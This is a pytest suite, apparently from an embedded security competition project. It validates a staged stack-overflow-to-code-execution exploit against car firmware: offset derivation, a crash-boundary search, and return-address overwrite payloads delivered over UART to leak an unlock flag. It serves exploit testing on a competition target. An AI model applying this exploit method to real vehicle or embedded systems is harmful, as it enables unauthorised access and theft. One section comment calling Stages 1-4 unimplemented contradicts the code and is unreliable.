"""
Meta-tests for the buffer-overflow-to-RCE derivation *tooling*
(overflow_offsets.py today; more helpers will land here as the staged plan
below fills in) - these test the analysis code itself, separately from
test_stack_overflow_poc.py's own slow, hardware-dependent, end-to-end
exploit test. The goal: a bug in how an offset or jump target gets derived
should show up here as a specific, cheap, mostly-hardware-free failure -
not as a confusing "the exploit didn't work" four layers downstream.

======================================================================
Staged validation plan
======================================================================
Recorded here in full so it survives without re-deriving it from
conversation history. Each stage only relies on what the previous stage
already proved.

Stage 0 (THIS FILE, IMPLEMENTED - test_lr_offset_static_*): static
derivation is deterministic across builds that shouldn't affect it.
derive_lr_offset_static() parses unlockCar()'s compiled prologue/epilogue
from a production (test=False) ELF. unlockCar() itself never references
CAR_ID anywhere in its own body (confirmed by reading car.c - CAR_ID only
ever reaches other functions via secrets.h/main()), and this build has no
-flto anywhere (SConstruct just does -O<n> - see SConstruct:148), so nothing
about a different car ID string elsewhere in the binary should be able to
perturb unlockCar()'s own compiled shape. test_lr_offset_static_is_car_id_independent
builds two cars that differ only in id and asserts derive_lr_offset_static()
agrees between them. Note this must build test=False (production): under
TEST_BUILD, unlockCar()'s own body is different (the #ifndef TEST_BUILD
flag-send block - the one this whole exploit chain targets - isn't there at
all), so a test=True build's derived offsets wouldn't describe the binary
being attacked.

Stage 1 (THIS FILE, IMPLEMENTED - test_reset_recovers_hung_car; hardware_only,
needs --using): the reset-only oracle. TestUnlockBufferOverflow
(test_security.py:130) already proves the crash-detection half on real
hardware (an oversized UNLOCK_MAGIC hangs a real car, detected via UART
timeout). This test proves the other half: that openocd.reset()
(tools/openocd.py, `monitor reset run` under the hood) reliably recovers a
hung car back to a normal, responsive state, without reflashing it. Needed
before Stage 2's search loop can trust "still not responding after reset" as
a real signal rather than a wedged rig.

Stage 2 (THIS FILE, IMPLEMENTED - test_dynamic_search_agrees_with_static_derivation;
hardware_only, needs --using): overflow_search.py's find_lr_offset_dynamic()
cross-checked against Stage 0's trusted static value on the same build.
Bisects hang/no-hang over actual message length (not a fixed 255-byte
payload with a shifting split - see overflow_search.py's module docstring
for why that distinction matters and why it leaves a small, unavoidable
fuzzy zone a few bytes wide right at the boundary). Its seeded fast-path
probes exactly the two CLEAN boundaries (seed_offset itself: message too
short to reach LR at all; seed_offset+4: poison fully covers it) so that
confirmation is exact, not approximate; its unseeded fallback rediscovers
the offset from scratch via full bisection and is checked with a small
tolerance instead, for the reason above. Deliberately reset-only (OpenOCD
reset, no debug reads of crash state) to keep the oracle faithful to what a
reset-only attacker (e.g. one toggling a MOSFET on the reset pin, not one
with live SWD read access) could actually observe - though the liveness
check itself turned out to need real hardware to design correctly: a
production car has zero host-observable commands at all (processHostCommand()
is entirely #ifdef TEST_BUILD), so the oracle is a real proto.cmd_btn_press()
handshake on the paired fob, not a direct query of the car. That in turn
means a "hung" result leaves the FOB stuck too, not just the car -
uart_readb()/uart_read() on this target are unbounded HAL_UART_Receive(...,
HAL_MAX_DELAY) reads, so the fob's own firmware blocks forever waiting for a
reply that will never come. _recover() resets both devices for exactly this
reason - see overflow_search.py's module docstring for the full trace.
MAX_MESSAGE_LEN in overflow_offsets.py bounds the search - this is also
where the buffer[255] sites in fob.c turned out to be structurally
unreachable via this exact mechanism, a real if accidental mitigation worth
its own regression test once those sites get their own derivation.

Stage 3 (THIS FILE, IMPLEMENTED - test_reentry_addr_hit_during_normal_unlock,
plus test_reentry_addr_is_car_id_independent/test_reentry_addr_fails_loudly_on_missing_callee
for the static half; hardware_only, needs --using): derive_reentry_addr()
(overflow_offsets.py) validated with zero exploit risk, by
using a completely normal unlock instead of the overflow. car.c has no debug
info in a plain (non debug=True) build (SConstruct's `debug` option is
separate from `test` and just isn't set here - see SConstruct:149-150), so
this can't use addr2line/source-line lookup, only disassembly
pattern-matching (find the `bl loadFlag` inside unlockCar(), walk backward
to the nearest preceding branch), same style as derive_lr_offset_static.
Validate it by setting a gdb breakpoint at the derived address (via
gdb_tools.py - shared with test_stack_overflow_poc.py's own OpenOCD/gdb
session handling, now extracted so Stage 4 doesn't need a third copy),
driving a real, legitimate unlock (real paired fob, proto.cmd_btn_press -
NOT a crafted payload), and confirming the breakpoint is actually hit during
ordinary execution. Deleting the breakpoint and resuming afterward lets the
rest of unlockCar() run completely undisturbed, giving a second,
independent confirmation for free: a real unlock flag comes out raw over
car.serial exactly as car.c's own unlockCar() docstring describes for a
production build (no "OK: " prefix - that's TEST_BUILD-only framing from an
older comment elsewhere in this file, not what actually happens here).

Stage 4 (THIS FILE, IMPLEMENTED - test_full_overflow_rce_debug_assisted /
test_full_overflow_rce_blind; hardware_only, needs --using): the real
end-to-end exploit - overflow_search.py's _craft_rce_payload() combines
Stage 0's lr_slot_offset with Stage 3's reentry_addr into filler up to the
saved LR, then reentry_addr itself (Thumb bit set) as the forged return
address. No shellcode, no live SP: unlockCar()'s own `pop {..., pc}` lands
execution directly back inside the already-compiled loadFlag()/uart_write()
block the MAC check normally guards. 4a stays debug-assisted - delivers the
payload for real over the wire (proto.cmd_send_board_msg, not gdb `restore`
like test_stack_overflow_poc.py's single-board version) but reuses Stage 3's
breakpoint machinery (gdb_tools.run_breakpoint_probe/assert_breakpoint_hit)
to confirm exactly where the corrupted return address actually took
execution, rather than only finding out indirectly from whether a flag
eventually showed up. 4b is the real regression test: identical delivery,
but no debugger anywhere - flag capture via car.serial.read()
(tools/devices.py's DeployedDevice.serial) alone, matching what a real
attacker with only board-to-board UART access (no debug probe on the
target) could actually do. Both need RoleConfig(..., test=False) for the car
(added to conftest.py alongside this file) while the fob stays test=True
(needs sendBoardMsg).
"""

import shutil
import sys
import time
from pathlib import Path

import pytest

from conftest import PROJECT_ROOT, RoleConfig, build_binary
from overflow_offsets import derive_lr_offset_static, derive_reentry_addr
from overflow_search import find_lr_offset_dynamic, _craft_payload, _craft_rce_payload
import gdb_tools
import protocol as proto

sys.path.insert(0, str(PROJECT_ROOT / "tools"))
import openocd  # noqa: E402

FLAG_SIZE = 64  # see application/include/platform.h
# Distinct from test_stack_overflow_poc.py's GDB_PORT (34449)/telnet (44490)
# in case both ever run in the same session.
GDB_PORT = 34450
TELNET_PORT = 44491

# Arbitrary, numeric, distinct from other builds' ids (see
# test_stack_overflow_poc.py's CAR_ID comment for why that matters - build
# artifacts are keyed on role+id, not on the test flag, so colliding with
# another id in use risks racing a concurrent session/test on this repo).
CAR_ID_A = "770001"
CAR_ID_B = "770002"
CAR_ID_C = "770003"  # Stage 1: real hardware deploys, kept distinct from the
                      # Stage 0 static-analysis-only builds above.
CAR_ID_D = "770004"  # Stage 2
CAR_ID_E = "770005"  # Stage 3
CAR_ID_F = "770006"  # Stage 4a (debug-assisted)
CAR_ID_G = "770007"  # Stage 4b (blind)


def _require_arm_toolchain():
    """Skip (not fail) when the ARM cross toolchain isn't available: this
    repo's default test run (no --using) never needs it (sim builds use the
    host's native gcc), so a machine without it should still be able to run
    the rest of the suite. Where it *is* available - like the dev machine
    this was written on - these tests run for real."""
    if shutil.which("arm-none-eabi-gcc") is None or shutil.which("arm-none-eabi-objdump") is None:
        pytest.skip("arm-none-eabi-gcc/objdump not found on PATH - needed to build and disassemble "
                     "firmware for static analysis (no hardware/probe required otherwise)")


def _build_car_elf(platform: str, car_id: str) -> Path:
    """Production (test=False) car ELF for `platform` - see this file's
    module docstring for why test=False specifically matters here."""
    return build_binary(RoleConfig("car", id=car_id, test=False), platform)


def _print_offsets(label: str, offsets) -> None:
    """Run with -s to see this - pytest swallows print() otherwise."""
    print(f"{label}: lr_slot_offset={offsets.lr_slot_offset}, "
          f"shellcode_offset={offsets.shellcode_offset}, "
          f"epilogue_addr={offsets.epilogue_addr:#x}, "
          f"sp_locals_delta={offsets.sp_locals_delta}, "
          f"reachable={offsets.reachable}")


@pytest.mark.parametrize("platform", ["stm32", "tm4c"])
def test_lr_offset_static_is_car_id_independent(platform):
    """Stage 0. See this file's module docstring. If this ever fails, don't
    assume it's a test bug first - it's saying the "CAR_ID never leaks into
    unlockCar()'s codegen" assumption broke (e.g. a future change starts
    branching on car ID inside unlockCar() itself), which every downstream
    stage - and test_stack_overflow_poc.py's own derivation - depends on."""
    _require_arm_toolchain()

    elf_a = _build_car_elf(platform, CAR_ID_A)
    elf_b = _build_car_elf(platform, CAR_ID_B)

    offsets_a = derive_lr_offset_static(elf_a, "unlockCar")
    offsets_b = derive_lr_offset_static(elf_b, "unlockCar")

    _print_offsets(f"[{platform}] id={CAR_ID_A}", offsets_a)
    _print_offsets(f"[{platform}] id={CAR_ID_B}", offsets_b)

    assert offsets_a == offsets_b, (
        f"derive_lr_offset_static() disagreed between car id={CAR_ID_A} and id={CAR_ID_B} "
        f"on platform={platform}: {offsets_a} vs {offsets_b}. unlockCar()'s compiled shape is "
        f"supposed to be CAR_ID-independent - see this test's docstring."
    )


@pytest.mark.parametrize("platform", ["stm32", "tm4c"])
def test_lr_offset_static_reports_plausible_values(platform):
    """Sanity-checks derive_lr_offset_static()'s output shape against what
    we independently know about unlockCar(): its overflowed buffer is a
    64-byte local (car.c: uint8_t buffer[64]) with real work happening
    between it and the return, so the LR slot should sit comfortably above
    64 bytes in - and, per the manually-derived numbers in
    test_stack_overflow_poc.py's docstring (140 on the STM32 build first
    seen), nowhere near the 251-byte reachability ceiling. This is a
    narrower check than the cross-id test above: it catches the derivation
    silently returning a technically-self-consistent but wrong-magnitude
    number (e.g. having picked up the wrong 'add rX, sp, #N' instruction),
    which two builds agreeing with each other wouldn't catch on its own."""
    _require_arm_toolchain()

    offsets = derive_lr_offset_static(_build_car_elf(platform, CAR_ID_A), "unlockCar")

    _print_offsets(f"[{platform}] id={CAR_ID_A}", offsets)

    assert 64 <= offsets.lr_slot_offset < 251, (
        f"lr_slot_offset={offsets.lr_slot_offset} is outside the plausible range for "
        f"unlockCar()'s 64-byte buffer on platform={platform} - see this test's docstring"
    )
    assert offsets.reachable, (
        f"unlockCar()'s LR slot came back unreachable (offset={offsets.lr_slot_offset}) on "
        f"platform={platform} - this bug is supposed to be exploitable; if the frame genuinely "
        f"grew past the wire limit, every downstream stage needs to know before anything else"
    )
    assert offsets.shellcode_offset == offsets.lr_slot_offset + 4
    assert offsets.epilogue_addr > 0
    assert offsets.sp_locals_delta > offsets.lr_slot_offset


def test_lr_offset_static_fails_loudly_on_missing_function():
    """derive_lr_offset_static() should raise a clear assertion, not an
    opaque IndexError/KeyError, when pointed at a function name that isn't
    in the ELF at all (typo, or optimized/#ifdef'd out) - this is the
    "fails loudly" contract the rest of this module's docstrings promise."""
    _require_arm_toolchain()

    elf = _build_car_elf("stm32", CAR_ID_A)
    with pytest.raises(AssertionError, match="no disassembly"):
        derive_lr_offset_static(elf, "thisFunctionDoesNotExist")


def test_craft_payload_shape():
    """No-hardware sanity check of overflow_search._craft_payload()'s byte
    layout - the geometry Stage 2's whole dynamic search depends on, cheap
    enough to check without a car at all (and exactly the kind of "does our
    own helper do what we want, and no more" check this file exists for)."""
    assert _craft_payload(10, filler=b"A", poison=b"\xff" * 4) == b"A" * 6 + b"\xff" * 4
    assert _craft_payload(4, filler=b"A", poison=b"\xff" * 4) == b"\xff" * 4  # all poison, no filler
    assert _craft_payload(2, filler=b"A", poison=b"\xff" * 4) == b"\xff" * 2  # poison truncated to fit
    assert _craft_payload(0, filler=b"A", poison=b"\xff" * 4) == b""
    for n in (0, 1, 2, 3, 4, 5, 64, 251, 255):
        assert len(_craft_payload(n)) == n


def test_craft_rce_payload_shape():
    """No-hardware sanity check of overflow_search._craft_rce_payload()'s
    byte layout - Stage 4's actual exploit payload. Checks the length
    (exactly lr_slot_offset + 4, no more), the filler region, and that the
    trailing 4 bytes decode back to reentry_addr with the Thumb bit set -
    independent of whatever real lr_slot_offset/reentry_addr Stage 0/3
    happen to measure on the attached hardware."""
    payload = _craft_rce_payload(lr_slot_offset=10, reentry_addr=0x08001f0e, filler=b"A")
    assert len(payload) == 14
    assert payload[:10] == b"A" * 10
    assert int.from_bytes(payload[10:14], "little") == (0x08001f0e | 1)

    # reentry_addr already odd (Thumb bit already set) shouldn't double up
    # or get cleared - `| 1` is idempotent.
    payload_odd = _craft_rce_payload(lr_slot_offset=10, reentry_addr=0x08001f0f, filler=b"A")
    assert int.from_bytes(payload_odd[10:14], "little") == 0x08001f0f

    assert len(_craft_rce_payload(lr_slot_offset=0, reentry_addr=0x08001f0e)) == 4


@pytest.mark.parametrize("platform", ["stm32", "tm4c"])
def test_reentry_addr_is_car_id_independent(platform):
    """Stage 3 static half. Same reasoning as
    test_lr_offset_static_is_car_id_independent: unlockCar()'s call to
    loadFlag() sits inside code that doesn't reference CAR_ID either, so
    derive_reentry_addr() should land on the identical address regardless
    of which car id the image was built for."""
    _require_arm_toolchain()

    addr_a = derive_reentry_addr(_build_car_elf(platform, CAR_ID_A), "unlockCar", "loadFlag")
    addr_b = derive_reentry_addr(_build_car_elf(platform, CAR_ID_B), "unlockCar", "loadFlag")

    print(f"[{platform}] id={CAR_ID_A}: reentry_addr={addr_a:#x}")
    print(f"[{platform}] id={CAR_ID_B}: reentry_addr={addr_b:#x}")

    assert addr_a == addr_b, (
        f"derive_reentry_addr() disagreed between car id={CAR_ID_A} and id={CAR_ID_B} on "
        f"platform={platform}: {addr_a:#x} vs {addr_b:#x}"
    )


def test_reentry_addr_fails_loudly_on_missing_callee():
    """derive_reentry_addr() should raise a clear assertion, not an opaque
    error, when the requested callee is never called in the function at all
    (wrong name, or - the realistic way this'd happen by accident - pointed
    at a TEST_BUILD image where the #ifndef TEST_BUILD call site guarding
    loadFlag() doesn't exist)."""
    _require_arm_toolchain()

    elf = _build_car_elf("stm32", CAR_ID_A)
    with pytest.raises(AssertionError, match="No 'bl <thisIsNotCalled>' found"):
        derive_reentry_addr(elf, "unlockCar", "thisIsNotCalled")


# ============================================================================
# Stages 1-4 - not yet implemented. See this file's module docstring for the
# full plan each of these is a placeholder for.
# ============================================================================

@pytest.mark.hardware_only
def test_reset_recovers_hung_car(deploy, hardware_config):
    """Stage 1. See this file's module docstring for the full plan this is
    part of. TestUnlockBufferOverflow (test_security.py:130) already proves
    the crash-detection half on real hardware; what this test adds is the
    other half - that `monitor reset run` via OpenOCD (openocd.reset(),
    tools/openocd.py) reliably recovers a hung car back to a normal,
    responsive state, rather than leaving it wedged. Every later stage that
    resets the target mid-search (Stage 2's find_lr_offset_dynamic()) is
    trusting this to be true; if it isn't, "still not responding after
    reset" stops being a meaningful signal and just means the rig is stuck.

    Deliberately re-triggers the crash itself here rather than depending on
    TestUnlockBufferOverflow having already run first - this test owns its
    own precondition."""
    car, fob = deploy(
        RoleConfig("car", id=CAR_ID_C),
        RoleConfig("paired_fob", id=CAR_ID_C, pin="123456"),
    )

    assert proto.cmd_is_locked(car, timeout=2.0).success, "Sanity check failed before attack"

    # Same crash as TestUnlockBufferOverflow: a length comfortably past the
    # 64-byte buffer, reaching the saved return address. Contents don't
    # matter here, only that it's long enough - this test isn't exercising
    # a precise offset, just "is the car definitely hung".
    proto.cmd_send_board_msg(fob, proto.UNLOCK_MAGIC, b"A" * 200)
    time.sleep(0.05)
    # unlockCar() won't reach its own return (and thus won't touch the
    # corrupted saved return address) until this second receive unblocks -
    # see TestUnlockBufferOverflow's comment for why the actual bytes here
    # don't matter.
    proto.cmd_send_board_msg(fob, proto.RESPONSE_MAGIC, b"\x00" * 8)
    time.sleep(0.2)

    resp = proto.cmd_is_locked(car, timeout=2.0)
    assert not resp.success, (
        "Car responded normally after the oversized UNLOCK message - expected it to have "
        "hung (see TestUnlockBufferOverflow). Can't test reset-recovery on a car that never "
        "actually crashed."
    )

    # The step under test: reset via the debug probe, standing in for an
    # attacker toggling a MOSFET on the reset pin (see openocd.reset()'s
    # docstring). Deliberately NOT a re-flash - this needs to prove recovery
    # without touching the image, since Stage 2's search loop can't afford
    # to reflash between every probe.
    rc = openocd.reset(hardware_config.board, hardware_config.identifiers[0])
    assert rc == 0, "OpenOCD reported the reset itself failed"

    time.sleep(1.0)  # generous reboot margin; this test is validating the
                      # mechanism, not timing it
    car.serial.reset_input_buffer()  # drop any boot banner ahead of our own
                                      # command, so recv() below can't read
                                      # stale bytes as the response to it

    resp = proto.cmd_is_locked(car, timeout=2.0)
    assert resp.success, (
        "Car did not respond normally after openocd.reset() - the reset-only recovery this "
        "test exists to validate did not work. (Note: reset() itself reported success above, "
        "so this is specifically the target not coming back, not OpenOCD failing to reset it.)"
    )


@pytest.mark.hardware_only
def test_dynamic_search_agrees_with_static_derivation(deploy, hardware_config):
    """Stage 2. See this file's module docstring for the full plan, and
    overflow_search.py's module docstring for why the seeded path is exact
    while the unseeded one only needs to land within a few bytes."""
    _require_arm_toolchain()

    # Ground truth from Stage 0, against the exact build we're about to deploy.
    static_offsets = derive_lr_offset_static(_build_car_elf(hardware_config.board, CAR_ID_D), "unlockCar")
    _print_offsets(f"[{hardware_config.board}] id={CAR_ID_D} (static)", static_offsets)
    assert static_offsets.reachable, (
        f"unlockCar()'s LR slot (offset={static_offsets.lr_slot_offset}) isn't reachable via "
        f"a uint8_t message_len - nothing here for the dynamic search to confirm"
    )

    car, fob = deploy(
        RoleConfig("car", id=CAR_ID_D, test=False),  # test=False to match the ELF derived above
        RoleConfig("paired_fob", id=CAR_ID_D, pin="123456"),
    )
    # Production car has no host commands at all (see overflow_search.py's
    # module docstring) - a real, credentialed unlock is the only
    # build-agnostic way to confirm both devices are alive before we start.
    assert proto.cmd_btn_press(fob, timeout=5.0).success, "Sanity check failed before searching"

    car_probe_serial, fob_probe_serial = hardware_config.identifiers[0], hardware_config.identifiers[1]

    # Seeded fast-path: two probes at the clean boundaries should confirm
    # the static value directly.
    seeded_result = find_lr_offset_dynamic(
        car, fob, hardware_config.board, car_probe_serial, fob_probe_serial,
        seed_offset=static_offsets.lr_slot_offset,
    )
    print(f"seeded_result={seeded_result} (static={static_offsets.lr_slot_offset}, "
          f"delta={seeded_result - static_offsets.lr_slot_offset})")
    assert seeded_result == static_offsets.lr_slot_offset, (
        f"Seeded fast-path returned {seeded_result}, expected it to confirm the static value "
        f"{static_offsets.lr_slot_offset} exactly"
    )

    # Deliberately wrong seed: the two boundary probes shouldn't confirm it,
    # so this should fall through to the full search internally and still
    # land close to the real answer rather than trusting a bad guess.
    wrong_seed_result = find_lr_offset_dynamic(
        car, fob, hardware_config.board, car_probe_serial, fob_probe_serial,
        seed_offset=static_offsets.lr_slot_offset - 20,
    )
    print(f"wrong_seed_result={wrong_seed_result} (static={static_offsets.lr_slot_offset}, "
          f"delta={wrong_seed_result - static_offsets.lr_slot_offset})")
    assert abs(wrong_seed_result - static_offsets.lr_slot_offset) <= 3, (
        f"With a deliberately wrong seed, expected the internal fallback to still land within "
        f"3 bytes of {static_offsets.lr_slot_offset}, got {wrong_seed_result}"
    )

    # Unseeded: rediscovers the offset from scratch via pure hang/no-hang
    # bisection. Tolerance, not exact equality - see overflow_search.py's
    # module docstring on the few-byte fuzzy zone at the boundary.
    unseeded_result = find_lr_offset_dynamic(
        car, fob, hardware_config.board, car_probe_serial, fob_probe_serial, seed_offset=None
    )
    print(f"unseeded_result={unseeded_result} (static={static_offsets.lr_slot_offset}, "
          f"delta={unseeded_result - static_offsets.lr_slot_offset})")
    assert abs(unseeded_result - static_offsets.lr_slot_offset) <= 3, (
        f"Unseeded search converged to {unseeded_result}, more than 3 bytes from the static "
        f"value {static_offsets.lr_slot_offset}"
    )


@pytest.mark.hardware_only
def test_reentry_addr_hit_during_normal_unlock(deploy, hardware_config, tmp_path):
    """Stage 3. See this file's module docstring for the full plan.

    Zero exploit risk: drives one completely normal, legitimately-credentialed
    unlock (real paired fob, proto.cmd_btn_press) - no crafted payload
    anywhere in this test - with a real gdb breakpoint sitting at
    derive_reentry_addr()'s output. If the breakpoint fires there during
    ordinary execution, that's direct proof the derived address really is
    the entry point of the loadFlag()/uart_write() block, not just a
    plausible-looking guess. Resuming past it and capturing the flag over
    HOST_UART is a second, independent confirmation that nothing about this
    process disturbed the car's normal operation."""
    _require_arm_toolchain()

    elf = _build_car_elf(hardware_config.board, CAR_ID_E)
    reentry_addr = derive_reentry_addr(elf, "unlockCar", "loadFlag")
    print(f"[{hardware_config.board}] id={CAR_ID_E}: reentry_addr={reentry_addr:#x}")

    car, fob = deploy(
        RoleConfig("car", id=CAR_ID_E, test=False),
        RoleConfig("paired_fob", id=CAR_ID_E, pin="123456"),
    )
    assert proto.cmd_btn_press(fob, timeout=5.0).success, "Sanity check failed before test"
    car.serial.reset_input_buffer()  # drop the sanity check's own flag output,
                                      # so the capture below is only this test's

    car_probe_serial = hardware_config.identifiers[0]
    openocd_proc = gdb_tools.start_openocd_gdbserver(hardware_config.board, car_probe_serial,
                                                       GDB_PORT, TELNET_PORT)
    try:
        gdb_tools.wait_for_gdbserver(elf, GDB_PORT)

        # Trigger a real, legitimate unlock while gdb waits at the
        # breakpoint. Its own success/failure isn't asserted on here: the
        # car is expected to be paused mid-unlockCar() when this call is
        # made, so the fob's own reply is delayed until gdb resumes it - not
        # a sign of anything wrong. The breakpoint-hit evidence (checked
        # below) and the flag capture are the actual assertions.
        gdb_stdout = gdb_tools.run_breakpoint_probe(
            elf, GDB_PORT, reentry_addr, tmp_path,
            trigger_fn=lambda: proto.cmd_btn_press(fob, timeout=15.0),
        )
    finally:
        gdb_tools.stop_openocd(openocd_proc)

    print(gdb_stdout)
    gdb_tools.assert_breakpoint_hit(gdb_stdout, reentry_addr)

    # Baseline: once resumed past the breakpoint, the unlock flag should
    # come out over the car's own HOST_UART exactly as it would with no
    # exploit involved at all.
    time.sleep(1.0)
    captured = car.serial.read(300)
    print(f"Captured {len(captured)} bytes over HOST_UART: {captured!r}")

    unlock_flag = (elf.parent / "flags.bin").read_bytes()[3 * FLAG_SIZE:4 * FLAG_SIZE].split(b"\x00", 1)[0]
    assert unlock_flag, "Couldn't read the expected unlock flag out of flags.bin"
    assert unlock_flag in captured, (
        f"Expected the real unlock flag ({unlock_flag!r}) over HOST_UART after resuming past "
        f"the breakpoint, but it wasn't found in {captured!r}"
    )


def _prep_rce_test(deploy, hardware_config, car_id: str):
    """Shared Stage 4a/4b setup: derive the static offset + reentry address,
    build the real exploit payload, deploy a production car + its paired
    fob, and sanity-check the pair before anything destructive happens.
    Returns (elf, static_offsets, reentry_addr, payload, car, fob)."""
    elf = _build_car_elf(hardware_config.board, car_id)
    static_offsets = derive_lr_offset_static(elf, "unlockCar")
    assert static_offsets.reachable, (
        f"unlockCar()'s LR slot (offset={static_offsets.lr_slot_offset}) isn't reachable via "
        f"a uint8_t message_len - can't build a payload that reaches it"
    )
    reentry_addr = derive_reentry_addr(elf, "unlockCar", "loadFlag")
    payload = _craft_rce_payload(static_offsets.lr_slot_offset, reentry_addr)
    print(f"[{hardware_config.board}] id={car_id}: lr_slot_offset={static_offsets.lr_slot_offset}, "
          f"reentry_addr={reentry_addr:#x}, payload_len={len(payload)}")

    car, fob = deploy(
        RoleConfig("car", id=car_id, test=False),
        RoleConfig("paired_fob", id=car_id, pin="123456"),
    )
    assert proto.cmd_btn_press(fob, timeout=5.0).success, "Sanity check failed before test"
    car.serial.reset_input_buffer()  # drop the sanity check's own flag output,
                                      # so the capture below is only this test's

    return elf, static_offsets, reentry_addr, payload, car, fob


def _deliver_rce_payload(fob, payload: bytes) -> None:
    """Send the crafted UNLOCK_MAGIC and unblock the second receive with a
    garbage RESPONSE_MAGIC (contents never matter - see
    TestUnlockBufferOverflow/overflow_search.py's _probe()). The 0.15s gap
    is the same real-hardware entropy-timing margin _probe() uses - see its
    docstring."""
    proto.cmd_send_board_msg(fob, proto.UNLOCK_MAGIC, payload)
    time.sleep(0.15)
    proto.cmd_send_board_msg(fob, proto.RESPONSE_MAGIC, b"\x00" * 8)


def _assert_flag_exfiltrated(car, elf: Path, wait: float = 1.5) -> None:
    """Read car.serial for the real unlock flag - the same baseline check
    Stage 3 used for a normal unlock, now checking the exploit produced the
    identical result."""
    time.sleep(wait)
    captured = car.serial.read(300)
    print(f"Captured {len(captured)} bytes over HOST_UART: {captured!r}")

    unlock_flag = (elf.parent / "flags.bin").read_bytes()[3 * FLAG_SIZE:4 * FLAG_SIZE].split(b"\x00", 1)[0]
    assert unlock_flag, "Couldn't read the expected unlock flag out of flags.bin"
    assert unlock_flag in captured, (
        f"Expected the real unlock flag ({unlock_flag!r}) to be exfiltrated over HOST_UART via "
        f"the wire-delivered overflow, but it wasn't found in {captured!r}"
    )


@pytest.mark.hardware_only
def test_full_overflow_rce_debug_assisted(deploy, hardware_config, tmp_path):
    """Stage 4a. See this file's module docstring for the full plan.

    First full combined run, still debug-assisted: the overflow payload is
    delivered for real, over the wire (proto.cmd_send_board_msg - not gdb
    `restore` like test_stack_overflow_poc.py's single-board version), but a
    breakpoint at reentry_addr confirms exactly where the corrupted return
    address actually took execution, instead of only finding out indirectly
    from whether a flag eventually showed up. Reuses Stage 3's own
    breakpoint machinery (gdb_tools.run_breakpoint_probe) - identical
    mechanics, only the trigger changes (the crafted wire payload instead of
    a normal unlock)."""
    _require_arm_toolchain()

    elf, static_offsets, reentry_addr, payload, car, fob = _prep_rce_test(deploy, hardware_config, CAR_ID_F)

    car_probe_serial = hardware_config.identifiers[0]
    openocd_proc = gdb_tools.start_openocd_gdbserver(hardware_config.board, car_probe_serial,
                                                       GDB_PORT, TELNET_PORT)
    try:
        gdb_tools.wait_for_gdbserver(elf, GDB_PORT)
        gdb_stdout = gdb_tools.run_breakpoint_probe(
            elf, GDB_PORT, reentry_addr, tmp_path,
            trigger_fn=lambda: _deliver_rce_payload(fob, payload),
        )
    finally:
        gdb_tools.stop_openocd(openocd_proc)

    print(gdb_stdout)
    gdb_tools.assert_breakpoint_hit(gdb_stdout, reentry_addr)

    # Same baseline as Stage 3: once resumed past the breakpoint, the real
    # flag should come out over HOST_UART exactly as the fully blind version
    # below (no debugger at all) needs to produce on its own.
    _assert_flag_exfiltrated(car, elf)


@pytest.mark.hardware_only
def test_full_overflow_rce_blind(deploy, hardware_config):
    """Stage 4b. See this file's module docstring for the full plan. The
    real regression test: everything test_full_overflow_rce_debug_assisted
    just proved, with NO debugger anywhere in this test - real wire delivery
    (proto.cmd_send_board_msg) and the flag read straight off car.serial.
    This is what a real attacker with only board-to-board UART access (no
    debug probe on the target) could actually do."""
    _require_arm_toolchain()

    elf, static_offsets, reentry_addr, payload, car, fob = _prep_rce_test(deploy, hardware_config, CAR_ID_G)

    _deliver_rce_payload(fob, payload)
    _assert_flag_exfiltrated(car, elf)
